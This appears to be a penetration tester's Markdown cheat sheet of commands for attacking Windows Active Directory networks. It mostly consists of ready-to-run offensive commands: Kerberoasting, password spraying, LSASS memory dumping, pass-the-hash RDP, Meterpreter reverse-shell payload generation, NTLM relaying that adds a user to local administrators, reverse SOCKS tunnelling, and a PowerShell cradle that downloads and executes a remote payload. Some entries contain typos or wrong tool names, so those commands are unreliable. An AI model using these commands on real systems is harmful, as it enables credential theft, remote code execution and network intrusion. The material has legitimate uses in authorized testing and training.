## Kerberoast
```
GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <TGSs_file>
```

## ASRepRoast
```
GetUsersSPNs.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <AS_REP_file>
```

## Password Policy (current user)
```
net accounts /domain
```

## Password Spraying with CME
```
cme smb <ip> -U <users_file> -p <password> -d <domain> --continue-on-success
```

## Password spraying with Kerberos (not logged by default on Windows Server)
```
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

## nmap TCP all ports
```
nmap -sS -n -Pn --open -p- -iL <file_with_ips> -oN <output_file>
```

## nmap UDP top 1000
```
nmap -sU -n -Pn --open --top-ports 1000 -iL <file_with_ips> -oN <outputfile>
```

## Powershell Port scanner
```
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
```
## nslookup
```
nslookup -q=mx <hostname>
nsllokup -typ2=ANY _ldap._tcp.dc._msdcs.<DOMAIN>
```
## Bloodhound
```
neo4j console &
bloodhound &
```

## Bloodhound Ingestors (ps1) : https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
```
Import-Module .\SharpHound.ps1
Invoke-BloodHound -collectiondmethods all
# Bloodhound Custom queries
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
```
## XFreeRDP
```
xfreerdp /v:<ip> /u:<user> /d:<domain> /dynamic-resolution /pth:NTLM
```

## Smbclient
```
smbclient \\ip\share$ -U user -W domain
```

## WMIExec
```
wmiexec.py <domain>/<username>:<password>@<ip>
```

## Dump
```
prcodump64.exe -accepteula -64 -ma <processname_or_pid> <output.dmp>
TaskMgr : righ-click : "Create dump file"
comsvcs.dll dump process
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
```
## MSFVenom : Windows x64 Stageless
```
msfvenom -p windows/x64/meterpreter_reverse_https lhost=eth0 lport=443  -f <format> -o <output_file> --encrypt=<type> --encrypt-key "<key>" -e <encoder> -i <iterations>
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.1.131 LPORT=443 -f raw -o shellcode.raw --encrypt=xor --encrypt-key "\x22" 
```
## MSFVenom : Windows x64 Staged
```
msfvenom -p windows/x64/meterpreter/reverse_https lport=443 lhost=<host> -f <format> -o <output_file> -e <encoder> -i <iterations>
```
## Meterpreter : exec command
```
execute -i -f <command_on_remote_host> -a <arguments>
execute -i nslookup -a hostname
```

## Meterpreter : migrate to process NAME
```
migrate -N <process_name>
```
## Meterpreter : list x64 process only
```
ps -A x64
```
## Meterpreter : import PS1 script
```
load powershell
powershell_import /root/tools/PowerView.ps1
powershell_execute Get-NetDomain
```

## Execute-Assembly
todo...

## SMBPipe : https://medium.com/@petergombos/smb-named-pipe-pivoting-in-meterpreter-462580fd41c5
```
pivot add -t pipe -l PIPEHOST -n PIPENAME -a <x86 or x64> -p windows 
```
## Get SMB Pipe on host to blend in (Powershell)
```
get-childitem \\.\pipe\
```
## Remove empty lines from file
```
sed '/^[[:space:]]*$/d' File_with_empty_lines.txt > File2.txt 
```
## Pivoting with MSF after meterpreter session is opened
```
1) in Metasploit
use auxiliary/server/socks5
run -j
2) in Metasploit
route add <subnet_from_internal_subnet_of_session> <session_#>
ex: route add 10.0.0.0/8 1
3) edit file
# /etc/proxychains.conf
socks5 127.0.0.1 1080
4) from cmd line
proxychains <command>
```

## Reverse Socks proxy with Chisel 
```
chisel client http://WANIP:443 R:0.0.0.0:8888:socks
chisel server --port 443 --reverse -v
```
## GPO audit with Grouper2 : https://github.com/l0ss/Grouper2
```
groupe2.exe -g -i 8 -f grouper2_output.html
```

## GPO Audit with PingCastle
todo...

## WMIC RCE
```
wmic process call create "cmd.exe /c calc.exe"
```
## WMIC List users from Group
```
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
```

## wmic list softwares
```
wmic product get name, version, vendor
```

## WMIC Domain/DC Infos
```
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
```
## LDAPSearch example
extract all enabled users to file
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=person)(objectClass=user)(\!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" sAMAccountName -D "user@domain.local" -W |grep -i samaccountname |cut -d " " -f 2 > users-enabled.txt
```
extract all Domain Controllers to file
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" sAMAccountName -D "user@domain.local" -W|grep -i samaccountname |cut -d " " -f 2 > dc-host.txt
```
extract all enabled computers
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName -D "user@domain.local" -W|grep -i samaccountname |cut -d " " -f 2 > computers-enabled.txt
```
extract all SRV2003 enabled
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=computer)(operatingSystem=Windows Server 2003*)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName -D "user@domain.local" -W|grep -i samaccountname |grep -i samaccountname |cut -d " " -f 2 > srv2003-enabled.txt
```
extract GPO name based on GUID
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=groupPolicyContainer)(name={1234B781-ACE0-1A84-BCF9-FE7BBA112D7D}))" displayname -D "user@domain.local" -W|grep -i displayname
```
## mitm6
todo...

## Inveigh (admin)
```
Invoke-inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
```
## Inveigh (user)
```
Invoke-inveigh -ConsoleOutput Y -NBNS Y
```

## Inveigh-Relay
```
Invoke-inveighrelay -consoleoutput y -target <IP_comma_separated> -showhelp n -statusoutput y -command "cmd.exe net localgroup administrators <DOMAIN\USER> /add" 
```
## Responder
```
Responder -I eth0 -rdw
```

## SMB_relay : https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
```
ntlmrelayx.py -tf targets.txt
ntlmrelayx.py -tf targets.txt -c <command>
```

## SeatBelt
```
seatbelt.exe -group=user
```
## PowerUp
```
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```
## PowerLessShell : https://github.com/Mr-Un1k0d3r/PowerLessShell
```
python PowerLessShell.py powershell.ps1 output
```
## Modify hash of Signed bin : https://github.com/Mr-Un1k0d3r/Windows-SignedBinary

## Powershell : download craddle iex
```
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://HOSTNAME/yolo-x64-stageless.txt')|iex
```
## Powershell 
```
powershell -execb -nop -w hidden -c "<commands>"
Get-Process
Get-Service
...
```
## Powershell Version
```
$psversiontable
```
## .Net Version CLR
```
%WINDIR%\Microsoft.Net\Framework\v4.0.30319\System.dll
```
## Unconstrained delegation : SpoolSample bug + Rubeus
todo...


## Raw shellcode to C
### "Another way to do big shellcode to C array. Puts it right into the correct format, variable names, braces, length, the whole bit. Then you just include shellcode.h"
### Source : "Solomon Sklash#7922" (Discord)
```
xxd -i shellcode.bin > shellcode.h
```
